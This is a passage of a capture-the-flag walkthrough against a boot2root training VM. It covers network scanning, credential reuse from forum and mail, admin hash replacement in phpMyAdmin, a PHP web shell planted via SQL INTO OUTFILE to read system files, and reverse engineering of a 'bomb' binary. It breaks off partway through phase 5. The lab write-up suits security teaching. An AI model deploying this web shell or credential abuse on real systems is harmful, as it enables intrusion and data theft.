

# **Boot2root - Walkthrough1**

## **RECONNAISSANCE**

The very first step of this project is finding the IP address of the boot2root virtual machine. To do so, we use the `ifconfig` command on the host machine.

 ```
vboxnet0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.56.1  netmask 255.255.255.0  broadcast 192.168.56.255
        inet6 fe80::800:27ff:fe00:0  prefixlen 64  scopeid 0x20<link>
        ether 0a:00:27:00:00:00  txqueuelen 1000  (Ethernet)
        RX packets 0  bytes 0 (0.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 52  bytes 7636 (7.6 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

*inet 192.168.56.1  netmask 255.255.255.0  broadcast 192.168.56.255* gives us the IP address of the virtual machine.

Now we got this, we can use **nmap** to map the network and find out which ports are open. Exploring the network will permit us to find potential vulnerabilities that will help us become root. 

The exact command we use is `nmap -sV <TARGET IP ADDRESS>`

- -sV stands for  *Version Scan* - detect the version of the services running on a certain port on the target

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-13 14:25 EST
Nmap scan report for paul-f4Br4s1.clusters.42paris.fr (192.168.56.1)
Host is up (0.00094s latency).
Not shown: 995 closed tcp ports (conn-refused)
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
111/tcp  open  rpcbind    2-4 (RPC #100000)
2049/tcp open  nfs_acl    3 (RPC #100227)
5900/tcp open  vnc        VNC (protocol 3.8)
9100/tcp open  jetdirect?
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Nmap scan report for 192.168.56.103
Host is up (0.0010s latency).
Not shown: 994 closed tcp ports (conn-refused)
PORT    STATE SERVICE  VERSION
21/tcp  open  ftp      vsftpd 2.0.8 or later
22/tcp  open  ssh      OpenSSH 5.9p1 Debian 5ubuntu1.7 (Ubuntu Linux; protocol 2.0)
80/tcp  open  http     Apache httpd 2.2.22 ((Ubuntu))
143/tcp open  imap     Dovecot imapd
443/tcp open  ssl/http Apache httpd 2.2.22
993/tcp open  ssl/imap Dovecot imapd
Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 256 IP addresses (2 hosts up) scanned in 17.45 seconds

```

### **Network description and possible exploit**

Now that we have a detailed description of the target network, we should look for known vulnerabilities for each service and each version of the service. To do so, we can use **exploit-db** and **github**, two useful resources in  infosec. 

- **FTP**: 
	- FTP sends **data unencrypted**. If we intercept the network traffic, we can read, modify, or steal files and passwords.
	- Using **hydra** and knowing a username, we can **brute force** the according password if the password policy is weak.
	- If the server is **misconfigured**, we can sometimes access some files using the username `anonymous` and a blank password.
- **SSH**:
	- Thanks to the [**CVE2018-15473**](https://github.com/Sait-Nuri/CVE-2018-15473) (*# OpenSSH 2.3 < 7.7 - Username Enumeration*), we know that the server gave different response for a valid or an invalid username.
	- In the same idea as for a ftp server, using **hydra** and knowing a username, we can try to **brute force** the according password.
- **HTTP/S**:
	- ***SQL Injection*** 
		- Injection allows an attacker to alter backend SQL statement by manipulating the user supplied data. It occurs when the user input is not properly sanitized and sent to interpreter as part of command and trick the interpreter into executing unintended commands and gives access to unauthorized data. 
		- It can lead to multiple implication. An attacker can inject malicious content into the vulnerable fields. If so, sensitive data like usernames, passwords, etc. can be read from the database. More over database data can be modified (insert/update/delete).

	-  ***Cross Site (XSS)***
		- XSS target scripts embedded in a page that are executed on the client side rather then at the server side. It occurs when the application takes untrusted data and send it to the web browser  without proper validation. 
		- The attacker can use this vulnerability to execute malicious code scripts via the browser. Since the latter can't know if the script is trusty or not, it will execute it. The attacker can hijack session cookies, deface the vulnerable website or even redirect the user to an unwanted and malicious sites.
		
	-  ***Broken Authentication***
		- When a user website session is ended, either by logout or browser closed abruptly, the corresponding session cookie and session ID should be invalidated. Each session should have a new cookie, indeed cookies contain sensitive data, like username, password, etc.. If cookies are not invalidated, the sensitive data will remain on the system.
		- If an attacker find that kind of vulnerabilities, he could gain access to another user's account, using a brute force attack, the use of weak credentials or a weak session cookies.
		
	-  ***Broken Access Control (IDOR)***
		- Some website's pages should be hidden from regular visitors. For instance, only the admin user should have access to a page that access others users. In the same idea, user should not have access to the account of other users. If so, it's a broken access control vulnerability. A regular user could access sensitive data from other regular users and access unauthorized functionalities.
		
	-  ***Security Misconfiguration***
		- Misconfiguration of permissions on cloud services.
		- Unnecessary features including debugging interfaces, pages, accounts and privileges.
		- Default credentials of default accounts
		- Overly detailed error messages giving critical system information to the attackers. 
	-  ***Security Misconfiguration***
		- A cryptographic failure is a vulnerability that happens when a cryptographic algorithm protecting sensitive information is misused (or worse, nonexistent). This vulnerability often cause web application divulging sensitive data, as customers data (names, dates of birth, financial information) or technical data such as usernames and passwords.
		- For instance, when you accessing a banking application via your browser, you wanna be sure that the communication between the client (your browser) and the server is encrypted. If it's not the case, an attacker could capture your network packets, and see your data plain-text, capturing sensitive information about you and your financial data.
		
-  **SSL/IMAP**: 
	- Internet Message Access Protocol enables user to access their email messages remotely through an internet connection. In substance, emails are kept on a server and not (always) stored on personal device. 
	- The main vulnerability of this protocol is the fact that it was designed to accept plain-text login credentials.

## Service Information:

Following the nmap scan, we know that the following ports are open, we also know the version of the service their running.

- **FTP Service (Port 21):** vsftpd 2.0.8 or later
- **SSH Service (Port 22):** OpenSSH 5.9p1 Debian 5ubuntu1.7
- **HTTP Service (Port 80):** Apache httpd 2.2.22
- **IMAP Service (Port 143):** Dovecot imapd
- **SSL/HTTP Service (Port 443):** Apache httpd 2.2.22
- **SSL/IMAP Service (Port 993):** Dovecot imapd
*DESCRIBE EVERY PORT/SERVICE/VERSION - EXPLOIT DB - COMMON EXPLOIT (example: ftp anonymous)*

## **EXPLOITATION**

#### **Step 1 - Directories Enumeration**

Since the ports 80 and 443 are opened, we can brute force directories using **gobuster**.
- -dir stands for directory, meaning we want to scan directories
- -k means that we want to skip the ssl verification (this flag will be useful when brute forcing the htpps server)
```
┌──(kali㉿kali)-[~]
└─$ gobuster dir --wordlist=/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --url=192.168.56.103    
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.56.103
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/forum                (Status: 403) [Size: 287]
/fonts                (Status: 301) [Size: 316] [--> http://192.168.56.103/fonts/]
/server-status        (Status: 403) [Size: 295]
Progress: 220560 / 220561 (100.00%)
===============================================================
Finished
===============================================================

```

```
┌──(kali㉿kali)-[~]
└─$ gobuster dir --wordlist=/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --url=https://192.168.56.103 -k
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     https://192.168.56.103
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/forum                (Status: 301) [Size: 318] [--> https://192.168.56.103/forum/]
/webmail              (Status: 301) [Size: 320] [--> https://192.168.56.103/webmail/]
/phpmyadmin           (Status: 301) [Size: 323] [--> https://192.168.56.103/phpmyadmin/]
/server-status        (Status: 403) [Size: 296]
Progress: 220560 / 220561 (100.00%)
===============================================================
Finished
===============================================================
```

#### **Step 2 - /forum**

That first page gives us several logins:
- quedevide
- thor
- wandre
- lmezard
- zaz
- admin
 
On the first page there's a post called **Probleme Login ?** by **lmezard**. Sounds interesting. Looking closely, we see this : ```Oct 5 08:45:29 BornToSecHackMe sshd[7547]: Failed password for invalid user !q\]Ej?*5K5cy*AJ from 161.202.39.38 port 57764 ssh2```.  The end of the line mention ssh daemon, let's try to connect through ssh with the credentials we've just found. Unfortunately it doesn't work. However those credentials give us access to the account of lmezard.

#### **Step 3 - lmezard account**
 
Once connected to the forum with the following credentials `lmezard | !q\]Ej?*5K5cy*AJ` we can access the user area, where we discover the email address (an thus the first name) of lmezard **laurie@borntosec.net**.

#### **Step 4 - laurie email account**

Since we got an email, we can visit **/webmail** and try to access the account of laurie with the password we found on the forum. Luckily it works. Reading her email, we find this: 

```
From: qudevide@mail.borntosec.net
Subject: DB Access
Date: Thu, October 8, 2015 10:25 pm
To: laurie@borntosec.net
----------
Hey Laurie,
You cant connect to the databases now. Use root/Fg-'kKXBj87E:aJ$
Best regards.
----------
```
This email is pretty useful as it contains credentials to access the database: `root | Fg-'kKXBj87E:aJ$`

#### **Step 5 - /phpmyadmin**

Once connected on php my admin, we have access to the database, we can modify it, delete or even add thing. We could try to change the password of the admin in order to try to login on his user area on the forum. To do so we can go to the  `forum_db -> mlf2_userdata`, and edit **admin**. Password are hashed, let's hash (md5) a password of our choice, and try to connect on the forum. The hash of `adminpwd` is `0a14de5a76e5e14758b04c209f266726`. We change the current hash by this new one, and connect to the admin account. We now have access to a bunch of new functionalities. Unfortunately none of them will be useful except maybe the email listing of the registered users.
- admin@borntosec.net
- qudevide@borntosec.net
- thor@borntosec.net
- wandre@borntosec.net
- laurie@borntosec.net
- zaz@borntosec.net 

#### **Step 6 - Backdoor webshell**

MySQL database can sometimes being vulnerable to SQL Injection to execute arbitrary commands. 
	
An SQL Injection allows an attacker to  add logical expressions and additional commands to an existing SQL Query. It's possible when the user input data in not properly validated by an application. For instance :
```$sql_query = "select * from users where user='$user' and password='$pass'"``` is used to validate user login requests. If the user submitted data is not properly sanitized, it's possible to pass through the login step with specially crafted values. For example, if we change the value '$user' by **'admin' or '1'='1'**, the attacker we pass the login screen because **or '1'='1'** is always true, ignoring the value of the password.

Using that technique we can writing arbitrary files, reading arbitrary files or even get a **webshell**.

Navigating through **/myphpadmin**, we notice clicking on the tab **SQL** that we can run a sql query on the server.

Let's craft our webshell. First we have to find a directory with write permission in order to create a file, in this case a webshell php script. Let's try the common ones (temporary directories used by popular CMS) :

	-   https://192.168.56.103/forum/templates_compiled/
	-   https://192.168.56.103/forum/templates_c/
	-   https://192.168.56.103/forum/templates/
	-   https://192.168.56.103/forum/temporary/
	-   https://192.168.56.103/forum/images/
	-   https://192.168.56.103/forum/cache/
	-   https://192.168.56.103/forum/temp/
	-   https://192.168.56.103/forum/files/

https://192.168.56.103/forum/templates_c/ seems to be writable.

Then we can create a webshell PHP script in that directory. 

Here's how we create a file using MySQL command:
`select "text" into outfile "/var/www/forum/templates_c/file.txt"`

And here's how we create a webshell in php:
`<? php system($_REQUEST['cmd']); ?>`

Altogether we have:

`SELECT "<?php system($_REQUEST['cmd']); ?>" INTO OUTFILE "/var/www/forum/templates_c/php_shell.php"`

We can now access our webshell using this url : **https://192.168.56.103/forum/templates_c/php_shell.php**

To execute command, we can append `?cmd=CMD` to the url, keeping in my it has to be formatted for an url, we can then use a url encoder to have the right format.

First, let's see where we are:

`https://192.168.56.103/forum/templates_c/php_shell.php?cmd=pwd` tells us we in /var/www/forum/templates_c as expected.

Now we can explore the directory tree, and try to list what's in the **/home** directory. In a simple shell we would do `cd /home; ls -la`, encoding this we get : 

`https://192.168.56.103/forum/templates_c/termmm.php?cmd=cd%20%2Fhome%3B%20ls%20-la` 

This command give us: 

```
total 0 drwxrwx--x 1 www-data root 60 Oct 13 2015 . drwxr-xr-x 1 root root 220 Feb 21 12:39 .. drwxr-x--- 2 www-data www-data 31 Oct 8 2015 LOOKATME drwxr-x--- 6 ft_root ft_root 156 Jun 17 2017 ft_root drwxr-x--- 3 laurie laurie 143 Oct 15 2015 laurie drwxr-x--- 1 laurie@borntosec.net laurie@borntosec.net 60 Oct 15 2015 laurie@borntosec.net dr-xr-x--- 2 lmezard lmezard 61 Oct 15 2015 lmezard drwxr-x--- 3 thor thor 129 Oct 15 2015 thor drwxr-x--- 4 zaz zaz 147 Oct 15 2015 zaz
```

We see that we have an interesting directory called **LOOKATME**. 

`https://192.168.56.103/forum/templates_c/termmm.php?cmd=cd%20%2Fhome%2FLOOKATME%3B%20ls%20-la`

We notice that we have a file called **password**, cat it.

`https://192.168.56.103/forum/templates_c/termmm.php?cmd=cat%20%2Fhome%2FLOOKATME%2Fpassword`

The content of **password** is finally displayed. We got `lmezard:G!@M6f4Eatau{sF"`

#### **Step 7 - FTP**

We know that the ports 21 and 22 are open. Those ports run respectively a ftp server and an ssh server. The credentials `lmezard | G!@M6f4Eatau{sF"` gives us access to the session of lmezard on the VM and on the ftp, but not on ssh. 

On the boot2root session we find 2 interesting files, one called README, telling us that we should complete a challenge to obtain the password of 'laurie' in order to connect via ssh, and the other one seems to list pcap files. It will be difficult for us to complete the challenge directly on the VM. 

Fortunately, those two files are available via ftp. Let's `get` them.
```
┌──(kali㉿kali)-[~]
└─$ ftp 192.168.56.103
Connected to 192.168.56.103.
220 Welcome on this server
Name (192.168.56.103:kali): lmezard
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||26872|)
150 Here comes the directory listing.
-rwxr-x---    1 1001     1001           96 Oct 15  2015 README
-rwxr-x---    1 1001     1001       808960 Oct 08  2015 fun
226 Directory send OK.
ftp> get README
local: README remote: README
229 Entering Extended Passive Mode (|||8655|)
150 Opening BINARY mode data connection for README (96 bytes).
100% |***********************************************************************|    96      860.09 KiB/s    00:00 ETA
226 Transfer complete.
96 bytes received in 00:00 (86.16 KiB/s)
ftp> get fun
local: fun remote: fun
229 Entering Extended Passive Mode (|||14622|)
150 Opening BINARY mode data connection for fun (808960 bytes).
100% |***********************************************************************|   790 KiB  153.16 MiB/s    00:00 ETA
226 Transfer complete.
808960 bytes received in 00:00 (142.52 MiB/s)

```

#### **Step 8 - fun Challenge**

First, we look closely the **fun** file. When we cat it, the output is really messy and gives us very few clues on how to solve the channel, except a main function telling us we should find a password of 12 characters and execute a shasum256 on it.

```
┌──(kali㉿kali)-[~]
└─$ cat fun       
ft_fun/0000750000175000001440000000000012575653666011066 5ustar  nnmusersft_fun/C4D03.pcap0000640000175000001440000000003412563172202012421 0ustar  nnmusers}void useless() {

//file259ft_fun/GKGEP.pcap0000640000175000001440000000003412563172202012541 0ustar  nnmusers}void useless() {

//file711ft_fun/A5GPY.pcap0000640000175000001440000000005312563172202012532 0ustar  nnmusers    printf("Hahahaha Got you!!!\n");

[ ... ]

int main() {
        printf("M");
        printf("Y");
        printf(" ");
        printf("P");
        printf("A");
        printf("S");
        printf("S");
        printf("W");
        printf("O");
        printf("R");
        printf("D");
        printf(" ");
        printf("I");
        printf("S");
        printf(":");
        printf(" ");
        printf("%c",getme1());
        printf("%c",getme2());
        printf("%c",getme3());
        printf("%c",getme4());
        printf("%c",getme5());
        printf("%c",getme6());
        printf("%c",getme7());
        printf("%c",getme8());
        printf("%c",getme9());
        printf("%c",getme10());
        printf("%c",getme11());
        printf("%c",getme12());
        printf("\n");
        printf("Now SHA-256 it and submit");
}

[...]

}void useless() {
        printf("Hahahaha Got you!!!\n");
}void useless() {
        printf("Hahahaha Got you!!!\n");
```

In this case, a good start would have been to directly use the command `file`.

```
┌──(kali㉿kali)-[~]
└─$ file fun          
fun: POSIX tar archive (GNU)
```

We decompress the archive with the command `tar -xf fun -C .`. We now have a directory named **ft_fun** containing  a lot of pcap files. Unfortunately, (I don't really know why), wireshark refuses to open them.

We've seen in the pseudo main that there's a function `getme` which seems responsible to get the characters we're looking for. We try to grep `getme` with the .pcap files we have.

```
┌──(kali㉿kali)-[~/ft_fun]
└─$ grep getme * 
0T16C.pcap:char getme4() {
4KAOH.pcap:char getme5() {
32O0M.pcap:char getme7() {
91CD0.pcap:char getme6() {
331ZU.pcap:char getme1() {
B62N4.pcap:char getme3() {
BJPCP.pcap:char getme8() {
BJPCP.pcap:char getme9() {
BJPCP.pcap:char getme10() {
BJPCP.pcap:char getme11() {
BJPCP.pcap:char getme12()
BJPCP.pcap:     printf("%c",getme1());
BJPCP.pcap:     printf("%c",getme2());
BJPCP.pcap:     printf("%c",getme3());
BJPCP.pcap:     printf("%c",getme4());
BJPCP.pcap:     printf("%c",getme5());
BJPCP.pcap:     printf("%c",getme6());
BJPCP.pcap:     printf("%c",getme7());
BJPCP.pcap:     printf("%c",getme8());
BJPCP.pcap:     printf("%c",getme9());
BJPCP.pcap:     printf("%c",getme10());
BJPCP.pcap:     printf("%c",getme11());
BJPCP.pcap:     printf("%c",getme12());
G7Y8I.pcap:char getme2() {
```

We can `cat`, for instance, the file `331ZU.pcap` which apparently contains the call of the function `getme1()`.

```
┌──(kali㉿kali)-[~/ft_fun]
└─$ cat 331ZU.pcap 
char getme1() {

//file5
``` 

We notice that we just have a part of the function itself. However we also have a comment `//file5`. We may suppose that the file `331ZU.pcap` is the fifth of all those .pcap files. Let's look for the sixth and see if this gets us somewhere.

```
┌──(kali㉿kali)-[~/ft_fun]
└─$ grep file6 *
0EQD2.pcap://file653
0L1FB.pcap://file645
[...]
AMH11.pcap://file697
APM1E.pcap://file6
AQLOW.pcap://file605
[...]
ZDVUB.pcap://file614
ZQTK1.pcap://file687
```

We cat the file `APM1E.pcap` : 

```
┌──(kali㉿kali)-[~/ft_fun]
└─$ cat APM1E.pcap
        return 'I';

//file6  
```

We have what we were looking for, we now know that the first character of the password, returned by `getme1()` is an **I**. Doing that for every `getme()` functions we get: `Iheartpwnage`. Recall that the main said that the password would be a sha-256 of it, which is `
330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4`.

 
#### **Step 9 - SSH (laurie)**

We connect to ssh with those credentials : `laurie | 330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4`. Once again we have two files, a README and a binary called **bomb**.

The README contains this :

```
Diffuse this bomb!
When you have all the password use it as "thor" user with ssh.

HINT:
P
 2
 b

o
4

NO SPACE IN THE PASSWORD (password is case sensitive).
```
As for the binary, it seems to be a mini game with several levels.

```
laurie@BornToSecHackMe:~$ ./bomb 
Welcome this is my little bomb !!!! You have 6 stages with
only one life good luck !! Have a nice day!
```

A good first approach would be to `gdb bomb` and grab some information of the core functioning of the binary.

```
(gdb) disas main
Dump of assembler code for function main:
   0x080489b0 <+0>:     push   %ebp
   0x080489b1 <+1>:     mov    %esp,%ebp
   0x080489b3 <+3>:     sub    $0x14,%esp
   0x080489b6 <+6>:     push   %ebx
   0x080489b7 <+7>:     mov    0x8(%ebp),%eax
   0x080489ba <+10>:    mov    0xc(%ebp),%ebx
   0x080489bd <+13>:    cmp    $0x1,%eax
   0x080489c0 <+16>:    jne    0x80489d0 <main+32>
   0x080489c2 <+18>:    mov    0x804b648,%eax
   0x080489c7 <+23>:    mov    %eax,0x804b664
   0x080489cc <+28>:    jmp    0x8048a30 <main+128>
   0x080489ce <+30>:    mov    %esi,%esi
   0x080489d0 <+32>:    cmp    $0x2,%eax
   0x080489d3 <+35>:    jne    0x8048a10 <main+96>
   0x080489d5 <+37>:    add    $0xfffffff8,%esp
   0x080489d8 <+40>:    push   $0x8049620
   0x080489dd <+45>:    mov    0x4(%ebx),%eax
   0x080489e0 <+48>:    push   %eax
   0x080489e1 <+49>:    call   0x8048880 <fopen@plt>
   0x080489e6 <+54>:    mov    %eax,0x804b664
   0x080489eb <+59>:    add    $0x10,%esp
   0x080489ee <+62>:    test   %eax,%eax
   0x080489f0 <+64>:    jne    0x8048a30 <main+128>
   0x080489f2 <+66>:    add    $0xfffffffc,%esp
   0x080489f5 <+69>:    mov    0x4(%ebx),%eax
   0x080489f8 <+72>:    push   %eax
   0x080489f9 <+73>:    mov    (%ebx),%eax
   0x080489fb <+75>:    push   %eax
   0x080489fc <+76>:    push   $0x8049622
   0x08048a01 <+81>:    call   0x8048810 <printf@plt>
   0x08048a06 <+86>:    add    $0xfffffff4,%esp
   0x08048a09 <+89>:    push   $0x8
   0x08048a0b <+91>:    call   0x8048850 <exit@plt>
   0x08048a10 <+96>:    add    $0xfffffff8,%esp
   0x08048a13 <+99>:    mov    (%ebx),%eax
   0x08048a15 <+101>:   push   %eax
   0x08048a16 <+102>:   push   $0x804963f
   0x08048a1b <+107>:   call   0x8048810 <printf@plt>
   0x08048a20 <+112>:   add    $0xfffffff4,%esp
   0x08048a23 <+115>:   push   $0x8
   0x08048a25 <+117>:   call   0x8048850 <exit@plt>
   0x08048a2a <+122>:   lea    0x0(%esi),%esi
   0x08048a30 <+128>:   call   0x8049160 <initialize_bomb>
   0x08048a35 <+133>:   add    $0xfffffff4,%esp
   0x08048a38 <+136>:   push   $0x8049660
   0x08048a3d <+141>:   call   0x8048810 <printf@plt>
   0x08048a42 <+146>:   add    $0xfffffff4,%esp
   0x08048a45 <+149>:   push   $0x80496a0
   0x08048a4a <+154>:   call   0x8048810 <printf@plt>
   0x08048a4f <+159>:   add    $0x20,%esp
   0x08048a52 <+162>:   call   0x80491fc <read_line>
   0x08048a57 <+167>:   add    $0xfffffff4,%esp
   0x08048a5a <+170>:   push   %eax
   0x08048a5b <+171>:   call   0x8048b20 <phase_1>
   0x08048a60 <+176>:   call   0x804952c <phase_defused>
   0x08048a65 <+181>:   add    $0xfffffff4,%esp
   0x08048a68 <+184>:   push   $0x80496e0
   0x08048a6d <+189>:   call   0x8048810 <printf@plt>
   0x08048a72 <+194>:   add    $0x20,%esp
   0x08048a75 <+197>:   call   0x80491fc <read_line>
   0x08048a7a <+202>:   add    $0xfffffff4,%esp
   0x08048a7d <+205>:   push   %eax
   0x08048a7e <+206>:   call   0x8048b48 <phase_2>
   0x08048a83 <+211>:   call   0x804952c <phase_defused>
   0x08048a88 <+216>:   add    $0xfffffff4,%esp
   0x08048a8b <+219>:   push   $0x8049720
   0x08048a90 <+224>:   call   0x8048810 <printf@plt>
   0x08048a95 <+229>:   add    $0x20,%esp
   0x08048a98 <+232>:   call   0x80491fc <read_line>
   0x08048a9d <+237>:   add    $0xfffffff4,%esp
   0x08048aa0 <+240>:   push   %eax
   0x08048aa1 <+241>:   call   0x8048b98 <phase_3>
   0x08048aa6 <+246>:   call   0x804952c <phase_defused>
   0x08048aab <+251>:   add    $0xfffffff4,%esp
   0x08048aae <+254>:   push   $0x804973f
   0x08048ab3 <+259>:   call   0x8048810 <printf@plt>
   0x08048ab8 <+264>:   add    $0x20,%esp
   0x08048abb <+267>:   call   0x80491fc <read_line>
   0x08048ac0 <+272>:   add    $0xfffffff4,%esp
   0x08048ac3 <+275>:   push   %eax
   0x08048ac4 <+276>:   call   0x8048ce0 <phase_4>
   0x08048ac9 <+281>:   call   0x804952c <phase_defused>
   0x08048ace <+286>:   add    $0xfffffff4,%esp
   0x08048ad1 <+289>:   push   $0x8049760
   0x08048ad6 <+294>:   call   0x8048810 <printf@plt>
   0x08048adb <+299>:   add    $0x20,%esp
   0x08048ade <+302>:   call   0x80491fc <read_line>
   0x08048ae3 <+307>:   add    $0xfffffff4,%esp
   0x08048ae6 <+310>:   push   %eax
   0x08048ae7 <+311>:   call   0x8048d2c <phase_5>
   0x08048aec <+316>:   call   0x804952c <phase_defused>
   0x08048af1 <+321>:   add    $0xfffffff4,%esp
   0x08048af4 <+324>:   push   $0x80497a0
   0x08048af9 <+329>:   call   0x8048810 <printf@plt>
   0x08048afe <+334>:   add    $0x20,%esp
   0x08048b01 <+337>:   call   0x80491fc <read_line>
   0x08048b06 <+342>:   add    $0xfffffff4,%esp
   0x08048b09 <+345>:   push   %eax
   0x08048b0a <+346>:   call   0x8048d98 <phase_6>
   0x08048b0f <+351>:   call   0x804952c <phase_defused>
   0x08048b14 <+356>:   xor    %eax,%eax
   0x08048b16 <+358>:   mov    -0x18(%ebp),%ebx
   0x08048b19 <+361>:   mov    %ebp,%esp
   0x08048b1b <+363>:   pop    %ebp
   0x08048b1c <+364>:   ret
End of assembler dump.

```
We notice that we have 6 phases, there's a `readline` taking the user input, if the input is correct we jump to the next phase, if the not the bomb blows up. 

**PHASE 1**: 

```
void phase_1(undefined4 param_1)

{
  int iVar1;
  
  iVar1 = strings_not_equal(param_1,"Public speaking is very easy.");
  if (iVar1 != 0) {
    explode_bomb();
  }
  return;
}
```

The answer of this phase is pretty obvious : **Public speaking is very easy.**.

**PHASE 2**:

```
void phase_2(undefined4 param_1)

{
  int iVar1;
  int aiStack_20 [7];
  
  read_six_numbers(param_1,aiStack_20 + 1);
  if (aiStack_20[1] != 1) {
    explode_bomb();
  }
  iVar1 = 1;
  do {
    if (aiStack_20[iVar1 + 1] != (iVar1 + 1) * aiStack_20[iVar1]) {
      explode_bomb();
    }
    iVar1 = iVar1 + 1;
  } while (iVar1 < 6);
  return;
}
```
We can suppose that the answer will be six numbers. The first if statement learns us the first number should be a **1**. As for the do while loop, we can read that the values in our number's array times the index + 1 should be equaled to the next value in the array. That gives us:

```
-> i = 0 | array[0] = 1
array[i] = 1
array[i] * i + 1 = array[i + 1] <=> array[0] * 2 = 2
i ++
-> i = 1 | array[1] = 2
array[i] = 2
array[i] * i + 1 = array[i + 1] <=> array[1] * 3 = 6
i ++
-> i = 2 | array[2] = 6
array[i] = 6
array[i] * i + 1 = array[i + 1] <=> array[2] * 4 = 24
i ++
-> i = 3 | array[3] = 24
array[i] = 24
array[i] * i + 1 = array[i + 1] <=> array[3] * 5 = 120
i ++
-> i = 4 | array[4] = 120
array[i] = 120
array[i] * i + 1 = array[i + 1] <=> array[4] * 6 = 720
i ++
-> i = 5 | array[5] = 720
```

Thus, the answer for the phase 2 is: **1 2 6 24 120 720**


**PHASE 3**:

```
void phase_3(char *param_1)

{
  int iVar1;
  char cVar2;
  uint local_10;
  char local_9;
  int local_8;
  
  iVar1 = sscanf(param_1,"%d %c %d",&local_10,&local_9,&local_8);
  if (iVar1 < 3) {
    explode_bomb();
  }
  switch(local_10) {
  case 0:
    cVar2 = 'q';
    if (local_8 != 0x309) {
      explode_bomb();
    }
    break;
  case 1:
    cVar2 = 'b';
    if (local_8 != 0xd6) {
      explode_bomb();
    }
    break;
  case 2:
    cVar2 = 'b';
    if (local_8 != 0x2f3) {
      explode_bomb();
    }
    break;
  case 3:
    cVar2 = 'k';
    if (local_8 != 0xfb) {
      explode_bomb();
    }
    break;
  case 4:
    cVar2 = 'o';
    if (local_8 != 0xa0) {
      explode_bomb();
    }
    break;
  case 5:
    cVar2 = 't';
    if (local_8 != 0x1ca) {
      explode_bomb();
    }
    break;
  case 6:
    cVar2 = 'v';
    if (local_8 != 0x30c) {
      explode_bomb();
    }
    break;
  case 7:
    cVar2 = 'b';
    if (local_8 != 0x20c) {
      explode_bomb();
    }
    break;
  default:
    cVar2 = 'x';
    explode_bomb();
  }
  if (cVar2 != local_9) {
    explode_bomb();
  }
  return;
}
```

This one is pretty easy, the answer is formatted this way `%d %c %d`. Thanks to the hints in the README, we know that the character should be a **b**. Which gives us, three possible options:

- 1 b 214
- 2 b 755
- 7 b 524

It worth noting that every combination of the switch statement gives us access to the phase_4. But only one will be part of the final password. We'll have to try the three possible options for the final password.

**PHASE 4**:

```
void phase_4(char *param_1)

{
  int iVar1;
  int local_8;
  
  iVar1 = sscanf(param_1,"%d",&local_8);
  if ((iVar1 != 1) || (local_8 < 1)) {
    explode_bomb();
  }
  iVar1 = func4(local_8);
  if (iVar1 != 0x37) {
    explode_bomb();
  }
  return;
}

int func4(int param_1)

{
  int iVar1;
  int iVar2;
  
  if (param_1 < 2) {
    iVar2 = 1;
  }
  else {
    iVar1 = func4(param_1 + -1);
    iVar2 = func4(param_1 + -2);
    iVar2 = iVar2 + iVar1;
  }
  return iVar2;
}
```

So far, the only thing we know is that we have to find an int, when passed to the function `func4` the return of this latter should be equal to 55 (0x37 or '7').

Let's rewrite those two in c.

```
int func4(int nb) {

        int var1;
        int var2;
        if (nb < 2) {

                var2 = 1;
        }
        else {
                var1 = func4(nb - 1);
                var2 = func4(nb - 2);
                var2 += var1;
        }
        return (var2);
}

void phase_4(void) {

        int v1;
        int v2;
        v1 = scanf("%d", &v2);
        if (v1 != 1 || v2 < 1)
        {
                printf("error len %d\n", v1);
                printf("%d is FALSE\n", v2);
                return;
        }
        v1 = func4(v2);
        if (v1 != 0x37) 
        {
                printf("%d is FALSE\n", v2);
                return;
        }
        printf("%d is the right number\n", v2);
        return;
}
```

Trying the program with different values, we finally find the one, **9**

**PHASE 5**:

```
void phase_5(int param_1)

{
  int iVar1;
  undefined local_c [6];
  undefined local_6;
  
  iVar1 = string_length(param_1);
  if (iVar1 != 6) {
    explode_bomb();
  }
  iVar1 = 0;
  do {
    local_c[iVar1] = (&array.123)[(char)(*(byte *)(iVar1 + param_1) & 0xf)];
    iVar1 = iVar1 + 1;
  } while (iVar1 < 6);
  local_6 = 0;
  iVar1 = strings_not_equal(local_c,"giants");
  if (iVar1 != 0) {
    explode_bomb();
  }
  return;
}
```

Further exploration in Ghidra gives us one more clue, `array.123` value is `"isrveawhobpnutfg"`. It looks like we have a kind of corresponding table.

Rewriting this code, we got :

```
void phase_5() {
        char line[6];
        char *key = "giants";
        int i = 0;
        while (i < 6) {
                for (char c = 'a'; c <= 'z'; c ++) {
                        char tmp;
                        tmp = "isrveawhobpnutfg"[c & 0xf];
                        if (tmp == key[i]) {
                                line[i] = c;
                                printf("line[%d] is %c\n",i, line[i]);
                                /* break; */
                        }
                }
                i ++;
        }
        if (!strcmp(line, "giants")) {
                printf("%s is the key\n", line);
        }
}
```

The program gives us four possibilities, 
	- `opekmq`
